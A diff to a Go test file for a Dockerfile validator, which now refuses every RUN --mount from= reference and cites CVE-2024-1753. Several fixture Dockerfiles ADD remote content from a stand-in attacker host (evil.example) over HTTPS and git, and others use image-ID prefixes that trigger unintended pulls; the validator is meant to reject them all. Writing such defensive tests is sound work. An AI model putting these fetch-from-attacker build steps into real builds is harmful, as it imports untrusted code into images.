@@ -15,8 +15,8 @@ import (
 // own parsers, and the first four with Docker 29.7 itself: `docker build
 // --network=none --pull=false` contacted Docker Hub for each.
 var dockerfileOutsideForm = map[string]struct{ file, rule string }{
-	// BuildKit reads from= by stage name only, so from=0 is an image.
-	"mount from index": {"FROM busybox\nRUN --mount=type=bind,from=0,target=/x true\n", ruleImageName},
+	// BuildKit reads from=0 as an image; every from= is refused now.
+	"mount from index": {"FROM busybox\nRUN --mount=type=bind,from=0,target=/x true\n", ruleMountFrom},
 	// `image inspect` finds a local image by an ID prefix; the build pulls the name.
 	"FROM ID prefix":       {"FROM 526f\nRUN true\n", ruleImageName},
 	"FROM sha256 prefix":   {"FROM sha256:526f86d9\n", ruleImageName},
@@ -76,7 +76,7 @@ var dockerfileOutsideForm = map[string]struct{ file, rule string }{
 	"SOURCE_DATE_EPOCH no ARG": {"FROM scratch AS sde\nADD https://evil.example/x /x\n", ruleRemoteAdd},
 	"ADD git scheme":           {"FROM busybox\nADD git://evil.example/r /x\n", ruleRemoteAdd},
 	"ADD JSON git":             {"FROM busybox\nADD [\"https://evil.example/r.git#main\", \"/x\"]\n", ruleRemoteAdd},
-	"mount from sha256":        {"FROM busybox\nRUN --mount=from=SHA256:526F,target=/x true\n", ruleImageName},
+	"mount from sha256":        {"FROM busybox\nRUN --mount=from=SHA256:526F,target=/x true\n", ruleMountFrom},
 	"COPY from sha256":         {"FROM busybox\nCOPY --from=sha256:abcd /a /b\n", ruleImageName},
 	"stage named by a number":  {"FROM busybox AS 1\n", ruleStageName},
 	"COPY parents quoted":      {"FROM busybox\nCOPY --parents=\"true\" a /b\n", ruleFlag},
@@ -193,8 +193,8 @@ func builderProblems(data []byte, images []string) []string {
 // TestStageReferencesOnlyEarlierStages (#274 F3, v0.2 Dockerfile
 // re-check): FROM names an earlier stage only by its exact lower-case
 // name, COPY --from by name in any case or by an index below the number
-// of earlier stages, RUN --mount from= by name only (BuildKit reads
-// from=0 as the image docker.io/library/0). Every other reference is an
+// of earlier stages; RUN --mount from= is refused (CVE-2024-1753, and
+// BuildKit reads from=0 as the image docker.io/library/0). Every other reference is an
 // image to check, and one `image inspect` could read as an image ID (a
 // hex prefix: FROM 526f inspects a local image, then the build pulls
 // docker.io/library/526f) is refused.
@@ -213,8 +213,8 @@ func TestStageReferencesOnlyEarlierStages(t *testing.T) {
 		"FROM stage case":     {"FROM alpine:3 AS build\nFROM Build\n", nil, ruleStageName},
 		"from index too high": {"FROM alpine:3\nCOPY --from=1 /x /x\n", nil, ruleImageName},
 		"copy from ID":        {"FROM alpine:3\nCOPY --from=526F86D9 /x /x\n", nil, ruleImageName},
-		"mount index":         {"FROM alpine:3\nRUN --mount=type=bind,from=0,target=/a true\n", nil, ruleImageName},
-		"mount index later":   {"FROM alpine:3 AS a\nFROM alpine:3\nRUN --mount=from=1,target=/a true\n", nil, ruleImageName},
+		"mount index":         {"FROM alpine:3\nRUN --mount=type=bind,from=0,target=/a true\n", nil, ruleMountFrom},
+		"mount stage":         {"FROM alpine:3 AS a\nFROM alpine:3\nRUN --mount=from=a,target=/a true\n", nil, ruleMountFrom},
 		"stage named twice":   {"FROM alpine:3 AS a\nFROM busybox AS A\n", nil, ruleStageName},
 		"stage name digit":    {"FROM alpine:3 AS 0x\n", nil, ruleStageName},
 	}
